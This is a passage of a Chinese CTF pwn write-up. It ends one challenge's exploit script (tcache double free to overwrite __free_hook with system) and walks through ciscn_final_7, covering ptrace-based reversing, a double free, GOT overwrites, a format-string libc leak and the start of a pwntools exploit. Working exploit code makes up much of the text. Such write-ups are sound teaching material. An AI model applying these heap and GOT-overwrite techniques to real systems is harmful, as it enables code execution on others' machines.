maze.split(<span class="string">'\n'</span>)</span><br><span class="line">    maze = [list(item[<span class="number">1</span>:<span class="number">-1</span>]) <span class="keyword">for</span> item <span class="keyword">in</span> maze][<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> maze:</span><br><span class="line">        print(<span class="string">''</span>.join(item))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># from maze[1][0] ==&gt; maze[40, 41]</span></span><br><span class="line">    sol = []</span><br><span class="line">    solve(maze, (<span class="number">1</span>, <span class="number">0</span>), (<span class="number">40</span>, <span class="number">41</span>), sol)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(sol[::<span class="number">-1</span>])</span><br><span class="line">    </span><br><span class="line">malloc_offset = libc.sym[<span class="string">"malloc"</span>]</span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf1147</span></span><br><span class="line">one_gadget_offset = <span class="number">0xf02a4</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get malloc address</span></span><br><span class="line">res = solve_maze()</span><br><span class="line">new(<span class="string">"0"</span>, len(res) + <span class="number">1</span>, res)</span><br><span class="line">p.recvuntil(<span class="string">"Here's the award:0x"</span>)</span><br><span class="line">libc_malloc = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_malloc - malloc_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line"><span class="comment"># since there is also double free in tcache bin 0x30 and 0x20</span></span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # fastbin double free</span></span><br><span class="line"><span class="comment"># new("1", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("2", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># load(1, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># store(False, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="string">"1"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"\n"</span>)</span><br><span class="line">load(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # write __malloc_hook (for fastbin double free)</span></span><br><span class="line"><span class="comment"># new("3", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, p64(__malloc_hook - 0x23) + "\n")</span></span><br><span class="line"><span class="comment"># new("4", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("5", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("6", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "A" * 0x13 + p64(one_gadget) + '\n')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="string">"3"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(__free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">new(<span class="string">"5"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">new(<span class="string">"6"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(libc_system) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __free_hook</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-7"><a href="#ciscn-final-7" class="headerlink" title="ciscn_final_7"></a>ciscn_final_7</h1><h2 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h2><p>强迫症驱使我把这个ciscn_final_7没做的空白填满，结果硬是断断续续地写了我两天，完了作业写不完了。<del>pwn使我失去理智。</del></p><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><ol><li>拖到IDA一看，父进程<code>fork</code>一个子进程，通过<code>ptrace</code>对子进程进行控制，代码的主要逻辑都在子进程中。同时因为子进程被父进程<code>ptrace</code>了，所以应该是不可能直接调试子进程了。</li><li>学一波<code>ptrace</code>的用法，大概了解之后，看一下父进程是怎么控制子进程的: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_401582</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __WAIT_STATUS stat_loc; <span class="comment">// [rsp+18h] [rbp-2A8h]</span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// [rsp+20h] [rbp-2A0h]</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-29Ch]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-298h]</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-294h]</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+30h] [rbp-290h]</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+34h] [rbp-28Ch]</span></span><br><span class="line">    __int64 v9; <span class="comment">// [rsp+38h] [rbp-288h]</span></span><br><span class="line">    <span class="keyword">char</span> v10; <span class="comment">// [rsp+40h] [rbp-280h]</span></span><br><span class="line">    __int64 v11; <span class="comment">// [rsp+C0h] [rbp-200h]</span></span><br><span class="line">    __int64 v12; <span class="comment">// [rsp+D8h] [rbp-1E8h]</span></span><br><span class="line">    __int64 v13[<span class="number">51</span>]; <span class="comment">// [rsp+120h] [rbp-1A0h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+2B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    HIDWORD(stat_loc.__iptr) = <span class="number">0</span>;</span><br><span class="line">    qword_604948 = (__int64)qword_604960;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">    <span class="keyword">while</span> ( LOBYTE(stat_loc.__uptr) == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v10);</span><br><span class="line">        v7 = ptrace(PTRACE_PEEKTEXT, a1, v11, <span class="number">0L</span>L);</span><br><span class="line">        v9 = (<span class="keyword">unsigned</span> __int8)ptrace(PTRACE_PEEKDATA, a1, v11 - <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="number">0xCC</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            ptrace(PTRACE_KILL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)(qword_604948 + <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v8 = (*(__int64 (__fastcall **)(<span class="keyword">char</span> *))(qword_604948 + <span class="number">16</span>))(&amp;v10);</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> ( v8 )</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &lt;= <span class="number">0</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                qword_604948 = v13[--HIDWORD(stat_loc.__iptr)];</span><br><span class="line">                v12 += <span class="number">8L</span>L;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                v11 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">                qword_604948 = *(_QWORD *)qword_604948;</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                ptrace(PTRACE_POKEDATA, a1, v12, *(_QWORD *)(qword_604948 + <span class="number">24</span>));</span><br><span class="line">                v3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &gt; <span class="number">48</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v13[SHIDWORD(stat_loc.__iptr)] = *(_QWORD *)qword_604948;</span><br><span class="line">                ++HIDWORD(stat_loc.__iptr);</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &gt; <span class="number">48</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v13[SHIDWORD(stat_loc.__iptr)] = *(_QWORD *)qword_604948;</span><br><span class="line">                ++HIDWORD(stat_loc.__iptr);</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                v4 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">136</span>; ++i )</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">if</span> ( qword_604978[<span class="number">4</span> * i] == v11 )</span><br><span class="line">                &#123;</span><br><span class="line">                    qword_604948 = (__int64)&amp;qword_604960[<span class="number">4</span> * i];</span><br><span class="line">                    v4 = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( !v4 )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)qword_604948;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">            v11 = *(_QWORD *)(qword_604948 + <span class="number">24</span>);</span><br><span class="line">        ptrace(PTRACE_SETREGS, a1, <span class="number">0L</span>L, &amp;v10); <span class="comment">// set regs</span></span><br><span class="line">        <span class="keyword">if</span> ( ptrace(PTRACE_CONT, a1, <span class="number">0L</span>L, <span class="number">0L</span>L) &lt; <span class="number">0</span> ) <span class="comment">// let child process continue</span></span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">"ptrace"</span>);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v14;</span><br><span class="line">        &#125;</span><br><span class="line">        wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>前面一堆<code>switch</code>啥的就不管了，重点在<code>ptrace(PTRACE_SETREGS, a1, 0LL, &amp;v10);</code>，因为设置完寄存器之后，就是通过<code>ptrace(PTRACE_CONT, a1, 0LL, 0LL)</code>把执行权限还给子进程了。</li><li>gdb动态调试，断在<code>ptrace(PTRACE_SETREGS, a1, 0LL, &amp;v10);</code>，查看第四个参数也就是<code>rcx</code>指向的位置，这是一个<code>user_regs_struce</code>的结构体（在”/user/include/sys/user.h”可以找到定义）： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r15;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r14;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r13;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r12;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rbp;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rbx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r11;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r10;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r9;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r8;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rax;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rcx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rdx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rsi;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rdi;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> orig_rax;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rip;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> cs;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> eflags;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rsp;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ss;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> fs_base;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> gs_base;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ds;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> es;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> fs;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>然后就是根据<code>rip</code>去binary里找汇编码，因为都是一段一段的，然后通过<code>int 3</code>返回父进程。所以就只能对着汇编码，借助寄存器的值，手动分析子进程的执行逻辑。</li><li>细节就不赘述了（感觉这种方法有点笨，如果有大佬能提供更好的方法，希望可以教教我），分析的结果如下： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">    function list:</span><br><span class="line">        110 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : size </span><br><span class="line">                second input after &quot;string: &quot; : content (end with &quot;\n&quot;)</span><br><span class="line">                chunk will be added to global variable &quot;chunk_array&quot;</span><br><span class="line">        119 &#x3D;&#x3D;&gt; no use at all, simply &quot;puts(&quot;sorry~\n&quot;);&quot; after input done</span><br><span class="line">        120 &#x3D;&#x3D;&gt; simply write something on the stack (no use at all)</span><br><span class="line">        238 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : index</span><br><span class="line">                free the chunk that recently malloc (pointer will not be reset to 0, </span><br><span class="line">                thus bring double free)</span><br><span class="line">        386 &#x3D;&#x3D;&gt; simply exit</span><br><span class="line"></span><br><span class="line">    some global variable:</span><br><span class="line">        0x605AC0 &#x3D;&#x3D;&gt; store the address of the chunk_array </span><br><span class="line">        0x604940 &#x3D;&#x3D;&gt; store the address of the present chunk</span><br><span class="line">        0x6040E0 &#x3D;&#x3D;&gt; store the times that &quot;free&quot; can be used (initialize to 4), if use up,</span><br><span class="line">                    the process will print out the chunk_array and simply exit</span><br><span class="line"></span><br><span class="line">    some constraints:</span><br><span class="line">        chunk size should satisfy &quot;size &gt; 0 &amp;&amp; size &lt;&#x3D; 0x7F&quot;</span><br><span class="line">        can only malloc at most 10 chunks (according to the free space in chunk_array)</span><br><span class="line">        for &quot;238&quot;(free) function, index should satisfy &quot;index &gt;&#x3D; 0 &amp;&amp; index &lt;&#x3D; 9&quot;</span><br><span class="line">        &quot;238&quot;(free) function can only be used 4 times (according to the value stored in 0x6040E0)</span><br><span class="line">    &#96;&#96;&#96; </span><br><span class="line">7. 程序没有开PIE。</span><br><span class="line">8. 首先用tcache double free，把&#96;0x6040E0&#96;处的值（可以执行&#96;free&#96;操作的次数）改大一点。</span><br><span class="line">9. 再此利用tcache double free，把&#96;0x605AC0&#96;改到bss上，达到清空&#96;chunk_array&#96;的目的，从而又能分配10个chunk</span><br><span class="line">10. 由于&#96;free&#96;限制解除了，再利用double free改&#96;atoi_got&#96;为&#96;printf_plt&#96;，从而利用fsb来leak栈上的libc地址。</span><br><span class="line">11. 最后double free改&#96;atoi_got&#96;为&#96;system&#96;，输入&quot;&#x2F;bin&#x2F;sh&quot;来getshell。</span><br><span class="line"></span><br><span class="line">## exp</span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def new(size, content, trans&#x3D;False):</span><br><span class="line">    if trans &#x3D;&#x3D; True:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%110c&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, &quot;%&quot; + str(size) + &quot;c&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;110&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, str(size))</span><br><span class="line">    p.sendlineafter(&quot;string:&quot;, content)</span><br><span class="line"></span><br><span class="line">def edit(index, content, trans&#x3D;False):</span><br><span class="line">    if trans &#x3D;&#x3D; True:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%120c&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, &quot;%&quot; + str(index) + &quot;c&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;120&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, str(index))</span><br><span class="line">    p.sendlineafter(&quot;string:&quot;, content)</span><br><span class="line"></span><br><span class="line">def delete(index, trans&#x3D;False):</span><br><span class="line">    if trans &#x3D;&#x3D; True:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%238c&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, &quot;%&quot; + str(index) + &quot;c&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;238&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, str(index))</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">function list:</span><br><span class="line">    110 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : size </span><br><span class="line">            second input after &quot;string: &quot; : content (end with &quot;\n&quot;)</span><br><span class="line">            chunk will be added to global variable &quot;chunk_array&quot;</span><br><span class="line">    119 &#x3D;&#x3D;&gt; no use at all, simply &quot;puts(&quot;sorry~\n&quot;);&quot; after input 